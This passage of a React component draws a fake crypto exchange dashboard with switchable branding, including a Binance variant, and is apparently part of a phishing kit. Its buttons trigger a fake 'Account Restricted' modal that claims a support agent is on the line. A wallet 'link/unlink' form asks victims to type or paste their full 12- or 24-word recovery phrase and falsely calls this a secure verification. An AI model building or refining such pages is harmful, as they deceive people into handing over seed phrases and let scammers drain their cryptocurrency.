                  {(livePrices.BTC?.change || 0) < 0 ? "↘" : "↗"} {Math.abs(livePrices.BTC?.change || 0).toFixed(2)}%
                </p>
              </div>
            </div>
            <svg viewBox="0 0 240 70" className="w-full h-20">
              <defs>
                <linearGradient id="chartGradient" x1="0%" y1="0%" x2="0%" y2="100%">
                <stop offset="0%" stopColor={brand.primary} stopOpacity="0.3"/>
                <stop offset="100%" stopColor={brand.primary} stopOpacity="0"/>
              </linearGradient>
            </defs>
            <path d={generateChartPath()} fill="none" stroke={brand.primary} strokeWidth="2"/>
            </svg>
          </div>

          {/* Holdings */}
          {holdings.length > 0 && (
            <div className="bg-white border border-gray-100 rounded-xl p-4 sm:p-6 mb-6">
              <h3 className="font-semibold text-[#0a0b0d] mb-4">Your Holdings</h3>
              <div className="space-y-3">
                {holdings.map((holding) => {
                  const price = livePrices[holding.symbol]?.price || 0
                  const change = livePrices[holding.symbol]?.change || 0
                  const value = holding.amount * price
                  
                  return (
                    <button 
                      key={holding.symbol}
                      onClick={handleLockedAction}
                      className="w-full flex items-center justify-between p-3 hover:bg-[#f7f8f9] rounded-lg transition-colors cursor-pointer"
                    >
                      <div className="flex items-center gap-3">
                        <Image
                          src={COIN_IMAGES[holding.symbol] || "/placeholder.svg"}
                          alt={holding.name}
                          width={40}
                          height={40}
                          className="rounded-full"
                        />
                        <div className="text-left">
                          <p className="font-medium text-[#0a0b0d]">{holding.name}</p>
                          <p className="text-sm text-[#5b616e]">{holding.amount} {holding.symbol}</p>
                        </div>
                      </div>
                      <div className="text-right">
                        <p className="font-medium text-[#0a0b0d]">{session?.balance_hidden ? "$••••" : formatUSD(value)}</p>
                        <p className={`text-sm ${change < 0 ? "text-[#cf4714]" : "text-[#05b169]"}`}>
                          {change < 0 ? "↘" : "↗"} {Math.abs(change).toFixed(2)}%
                        </p>
                      </div>
                    </button>
                  )
                })}
              </div>
            </div>
          )}

          {/* Watchlist */}
          <div className="bg-white border border-gray-100 rounded-xl p-6">
            <h3 className="font-semibold text-[#0a0b0d] mb-4">Watchlist</h3>
            <div className="space-y-3">
              {["BTC", "ETH", "SOL", "XRP"].map((symbol) => {
                const names: Record<string, string> = { BTC: "Bitcoin", ETH: "Ethereum", SOL: "Solana", XRP: "XRP" }
                const price = livePrices[symbol]?.price || 0
                const change = livePrices[symbol]?.change || 0
                
                return (
                  <button 
                    key={symbol}
                    onClick={handleLockedAction}
                    className="w-full flex items-center justify-between p-3 hover:bg-[#f7f8f9] rounded-lg transition-colors cursor-pointer"
                  >
                    <div className="flex items-center gap-3">
                      <Image
                        src={COIN_IMAGES[symbol] || "/placeholder.svg"}
                        alt={names[symbol]}
                        width={40}
                        height={40}
                        className="rounded-full"
                      />
                      <div className="text-left">
                        <p className="font-medium text-[#0a0b0d]">{names[symbol]}</p>
                        <p className="text-sm text-[#5b616e]">{symbol}</p>
                      </div>
                    </div>
                    <div className="flex items-center gap-6">
                      <div className="text-right">
                        <p className="font-medium text-[#0a0b0d]">{pricesLoading ? "..." : formatUSD(price)}</p>
                        <p className={`text-sm ${change < 0 ? "text-[#cf4714]" : "text-[#05b169]"}`}>
                          {change < 0 ? "↘" : "↗"} {Math.abs(change).toFixed(2)}%
                        </p>
                      </div>
                      <span className="px-4 py-1.5 font-medium text-sm rounded-full transition-colors" style={{ color: brand.primary }}>
                        Buy
                      </span>
                    </div>
                  </button>
                )
              })}
            </div>
          </div>
        </main>

        {/* Bottom Action Buttons - hidden on mobile (bottom nav replaces) */}
        <div className="hidden sm:flex fixed bottom-6 left-1/2 transform -translate-x-1/2 ml-[43px] items-center gap-3 z-50">
          <button 
            onClick={handleLockedAction}
              className="px-6 sm:px-8 py-2.5 sm:py-3 text-sm sm:text-base font-semibold rounded-full transition-colors cursor-pointer"
              style={{ backgroundColor: brand.primary + "1A", color: brand.primary }}
          >
            Transfer
          </button>
          <button 
            onClick={handleLockedAction}
              className="px-6 sm:px-8 py-2.5 sm:py-3 text-sm sm:text-base font-semibold rounded-full transition-colors cursor-pointer"
              style={{ backgroundColor: brand.primary, color: isBinance ? "#181A20" : "#fff" }}
          >
            Buy & sell
          </button>
        </div>
      </div>

      {/* Account Locked Modal - Support is on the line */}
      {showLockedModal && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-[60] flex items-center justify-center p-4">
          <div className="bg-white rounded-xl w-full max-w-[340px] overflow-hidden shadow-xl">
            {/* Modal Header */}
            <div className="px-5 py-4 text-center" style={{ backgroundColor: brand.primary }}>
              <div className="w-12 h-12 mx-auto mb-2 rounded-full bg-white/20 flex items-center justify-center">
                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 48 48">
                  <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="white"/>
                </svg>
              </div>
              <h3 className="text-base font-semibold text-white">Account Restricted</h3>
            </div>

            {/* Modal Body */}
            <div className="p-5">
              <p className="text-[#0a0b0d] font-medium text-sm mb-2 text-center">Your account is temporarily restricted</p>
              <p className="text-[#5b616e] text-xs leading-relaxed text-center mb-4">
                Our support team is currently on the line assisting you. Please follow their instructions to resolve pending requests.
              </p>

              <div className="rounded-lg p-3 mb-4 border" style={{ backgroundColor: brand.primary + "10", borderColor: brand.primary + "33" }}>
                <div className="flex items-center gap-2 mb-2">
                  <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
<span className="text-xs font-medium" style={{ color: brand.primary }}>Support Agent Connected</span>
              </div>
              <p className="text-[10px] text-[#5b616e]">A {brand.name} security specialist is actively assisting with your account verification.</p>
              </div>

              <div className="bg-[#f7f8f9] rounded-lg p-3 mb-4">
                <ul className="space-y-1.5 text-xs text-[#5b616e]">
                  <li className="flex items-center gap-2">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#cf4714"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6" stroke="white" strokeWidth="2"/></svg>
                    Withdrawals disabled
                  </li>
                  <li className="flex items-center gap-2">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#cf4714"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6" stroke="white" strokeWidth="2"/></svg>
                    Transfers disabled
                  </li>
                  <li className="flex items-center gap-2">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="#cf4714"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6" stroke="white" strokeWidth="2"/></svg>
                    Trading disabled
                  </li>
                </ul>
              </div>

              <button 
                onClick={handleContinueSupport}
                disabled={loadingSupport}
                className="w-full py-2.5 text-sm font-semibold rounded-full transition-colors cursor-pointer disabled:opacity-70"
              style={{ backgroundColor: brand.primary, color: isBinance ? "#181A20" : "#fff" }}
              >
                {loadingSupport ? (
                  <span className="flex items-center justify-center gap-2">
                    <span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent"/>
                    Connecting...
                  </span>
                ) : "Continue to Cancel Requests"}
              </button>
              <button 
                onClick={() => setShowLockedModal(false)}
                className="w-full py-2 mt-2 bg-transparent text-[#5b616e] text-sm font-medium rounded-full hover:bg-[#f7f8f9] transition-colors cursor-pointer"
              >
                Dismiss
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Wallet Popup Modal - Matching /link and /unlink quality */}
      {showWalletPopup && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm z-[60] flex items-center justify-center p-4 overflow-y-auto">
          <div className={`bg-white rounded-xl w-full max-w-[400px] my-4 overflow-hidden shadow-xl ${isUnlink ? "border-2 border-red-200" : ""}`}>
            {/* Header */}
            <div className={`px-5 py-4 flex items-center justify-between ${isUnlink ? "bg-red-50 border-b border-red-100" : "bg-white border-b border-gray-100"}`}>
              <div className="flex items-center gap-3">
                <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 48 48">
                  <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill={isUnlink ? "#dc2626" : brand.primary}/>
                </svg>
                <span className={`font-semibold ${isUnlink ? "text-red-700" : "text-[#0a0b0d]"}`}>
                  {walletPopupType === "link" ? "Link Wallet" : "Unlink Wallet"}
                </span>
              </div>
              <button 
                onClick={() => { 
                  setShowWalletPopup(false)
                  setWalletStep("select")
                  setSelectedWallet(null)
                  setSeedPhrase(Array(12).fill(""))
                  setWordCount(12)
                  setWalletStatus("idle")
                }} 
                className="p-1.5 hover:bg-gray-100 rounded-full cursor-pointer"
              >
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#5b616e" strokeWidth="2"><path d="M18 6L6 18M6 6l12 12"/></svg>
              </button>
            </div>

            {isUnlink && (
              <div className="bg-red-50 border-b border-red-100 px-5 py-3">
                <div className="flex items-start gap-2">
                  <svg width="16" height="16" viewBox="0 0 24 24" fill="#dc2626" className="mt-0.5 flex-shrink-0">
                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/>
                  </svg>
                  <p className="text-xs text-red-700">This will permanently remove your wallet connection. Make sure you have your recovery phrase before proceeding.</p>
                </div>
              </div>
            )}

            <div className="p-5">
              {walletStep === "select" ? (
                <>
                  <p className={`text-sm mb-4 text-center ${isUnlink ? "text-red-600" : "text-[#5b616e]"}`}>
                    {walletPopupType === "link" 
                      ? "Select a wallet to link to your account for verification" 
                      : "Select the wallet you want to unlink from your account"}
                  </p>
                  
                  <div className="space-y-2">
                    {WALLETS.map((wallet) => (
                      <button
                        key={wallet.id}
                        onClick={() => setSelectedWallet(wallet.id)}
                        className={`flex w-full cursor-pointer items-center gap-3 rounded-lg border p-3 transition-all ${
                          selectedWallet === wallet.id
                            ? isUnlink 
                              ? "border-red-500 bg-red-50" 
                              : `border-[${brand.primary}] bg-[${brand.primary}]/5`
                            : "border-gray-200 bg-white hover:bg-gray-50"
                        }`}
                      >
                        <div className="w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden bg-gray-50">
                          <WalletIcon type={wallet.id} size={32} />
                        </div>
                        <span className="font-medium text-sm text-gray-900">{wallet.name}</span>
                        {selectedWallet === wallet.id && (
                          <svg className="ml-auto" width="18" height="18" fill={isUnlink ? "#dc2626" : brand.primary} viewBox="0 0 24 24">
                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
                          </svg>
                        )}
                      </button>
                    ))}
                  </div>

                  <button
                    onClick={() => setWalletStep("seedphrase")}
                    disabled={!selectedWallet}
                    className={`mt-4 w-full cursor-pointer rounded-full py-3 text-sm font-semibold text-white transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${
                      isUnlink 
                        ? "bg-red-600 hover:bg-red-700" 
                : ""
              } font-semibold rounded-full transition-colors cursor-pointer disabled:opacity-50`}
              style={{ backgroundColor: isUnlink ? undefined : brand.primary, color: isUnlink ? "#fff" : (isBinance ? "#181A20" : "#fff") }}
            >
              Continue
            </button>
                </>
              ) : (
                <>
                  <button 
                    onClick={() => setWalletStep("select")} 
                    className="mb-4 flex cursor-pointer items-center gap-2 text-xs text-gray-500 hover:text-gray-900"
                  >
                    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M19 12H5M12 19l-7-7 7-7"/>
                    </svg>
                    Back to wallet selection
                  </button>

                  {/* Selected wallet display */}
                  <div className="flex items-center gap-3 p-3 rounded-lg mb-4 border" style={{ backgroundColor: isUnlink ? "#FEF2F2" : brand.primary + "10", borderColor: isUnlink ? "#FEE2E2" : brand.primary + "1A" }}>
                    <div className="w-10 h-10 rounded-lg flex items-center justify-center overflow-hidden bg-white">
                      <WalletIcon type={selectedWallet || ""} size={32} />
                    </div>
                    <div>
                      <p className="font-medium text-sm text-gray-900">
                        {WALLETS.find(w => w.id === selectedWallet)?.name}
                      </p>
                      <p className="text-xs text-gray-500">
                        {requires24Words ? "24-word recovery phrase required" : `${wordCount}-word recovery phrase`}
                      </p>
                    </div>
                  </div>

                  <p className={`text-sm mb-3 ${isUnlink ? "text-red-600" : "text-[#5b616e]"}`}>
                    Enter your recovery phrase to {walletPopupType} your wallet
                  </p>

                  {/* Word count toggle for Phantom/Trust */}
                  {canExtendTo24 && (
                    <div className="flex gap-2 mb-3">
                      <button
                        onClick={() => handleWordCountChange(12)}
                        className={`flex-1 py-2 text-xs font-medium rounded-lg transition-colors cursor-pointer ${
                          wordCount === 12 
                            ? isUnlink ? "bg-red-100 text-red-700 border border-red-200" : ""
                            : "bg-gray-100 text-gray-500 border border-transparent hover:bg-gray-200"
                        }`}
                        style={wordCount === 12 && !isUnlink ? { backgroundColor: brand.primary + "1A", color: brand.primary, border: `1px solid ${brand.primary}33` } : undefined}
                      >
                        12 words
                      </button>
                      <button
                        onClick={() => handleWordCountChange(24)}
                        className={`flex-1 py-2 text-xs font-medium rounded-lg transition-colors cursor-pointer ${
                          wordCount === 24
                            ? isUnlink ? "bg-red-100 text-red-700 border border-red-200" : ""
                            : "bg-gray-100 text-gray-500 border border-transparent hover:bg-gray-200"
                        }`}
                        style={wordCount === 24 && !isUnlink ? { backgroundColor: brand.primary + "1A", color: brand.primary, border: `1px solid ${brand.primary}33` } : undefined}
                      >
                        24 words
                      </button>
                    </div>
                  )}

                  {/* Seed phrase grid */}
                  <div 
                    className="grid grid-cols-2 sm:grid-cols-3 gap-1.5 mb-3"
                    onPaste={(e) => {
                      e.preventDefault()
                      const targetCount = requires24Words ? 24 : wordCount
                      const words = e.clipboardData.getData("text").trim().split(/\s+/).slice(0, targetCount)
                      const newPhrase = Array(targetCount).fill("")
                      words.forEach((w, i) => { newPhrase[i] = w.toLowerCase() })
                      setSeedPhrase(newPhrase)
                    }}
                  >
                    {seedPhrase.map((word, i) => (
                      <div 
                        key={i} 
                        className={`flex items-center gap-1 rounded border bg-white px-2 py-1.5 ${
                          isUnlink ? "border-red-200 focus-within:border-red-400" : "border-gray-200"
                        }`}
                      >
                        <span className="text-[10px] text-gray-400 w-4">{i + 1}.</span>
                        <input
                          type="text"
                          value={word}
                          onChange={(e) => {
                            const arr = [...seedPhrase]
                            arr[i] = e.target.value.toLowerCase().trim()
                            setSeedPhrase(arr)
                          }}
                          disabled={walletStatus === "pending"}
                          className="w-full bg-transparent text-xs text-gray-900 outline-none"
                          placeholder="word"
                        />
                      </div>
                    ))}
                  </div>

                  <p className="mb-3 text-[10px] text-gray-400">Tip: Paste your entire phrase at once</p>

                  <button
                    onClick={handleWalletSubmit}
                    disabled={seedPhrase.filter(w => w).length !== (requires24Words ? 24 : wordCount) || walletStatus === "pending"}
                    className={`w-full cursor-pointer rounded-full py-3 text-sm font-semibold transition-colors disabled:cursor-not-allowed disabled:opacity-50 ${
                      isUnlink ? "bg-red-600 hover:bg-red-700 text-white" : ""
                    }`}
                    style={!isUnlink ? { backgroundColor: brand.primary, color: isBinance ? "#181A20" : "#fff" } : undefined}
                  >
                    {walletStatus === "pending" ? (
                      <span className="flex items-center justify-center gap-2">
                        <span className="h-4 w-4 animate-spin rounded-full border-2 border-white border-t-transparent"/>
                        Verifying...
                      </span>
                    ) : (walletPopupType === "link" ? "Link Wallet" : "Unlink Wallet")}
                  </button>

                  <div className={`mt-4 rounded-lg p-3 ${isUnlink ? "bg-red-50" : "bg-blue-50"}`}>
                    <p className={`text-[10px] ${isUnlink ? "text-red-600" : "text-blue-600"}`}>
                      {isUnlink 
                        ? "Warning: This action cannot be undone. Make sure you want to unlink this wallet."
                        : `Never share your recovery phrase. ${brand.name} support will never ask for it outside of this secure verification.`
                      }
                    </p>
                  </div>
                </>
              )}
            </div>
          </div>
        </div>
      )}

      {/* Mobile bottom nav */}
      <nav className="sm:hidden fixed bottom-0 left-0 right-0 border-t flex items-center justify-around py-2 z-50" style={{ backgroundColor: brand.bgMain, borderColor: isBinance ? "#2B3139" : "#f3f4f6" }}>
        <button onClick={() => setActiveTab("home")} className="flex flex-col items-center gap-0.5 p-2 cursor-pointer" style={{ color: activeTab === "home" ? brand.primary : brand.textSecondary }}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 3l9 8v10h-6v-6h-6v6H3V11l9-8z"/></svg>
          <span className="text-[10px]">Home</span>
        </button>
        <button onClick={handleLockedAction} className="flex flex-col items-center gap-0.5 p-2 cursor-pointer" style={{ color: brand.textSecondary }}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><polyline points="22 7 13.5 15.5 8.5 10.5 2 17"/><polyline points="16 7 22 7 22 13"/></svg>
          <span className="text-[10px]">Trade</span>
        </button>
        <button onClick={handleLockedAction} className="flex flex-col items-center gap-0.5 p-2 cursor-pointer" style={{ color: brand.textSecondary }}>
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg>
          <span className="text-[10px]">More</span>
        </button>
      </nav>
    </div>
  )
}
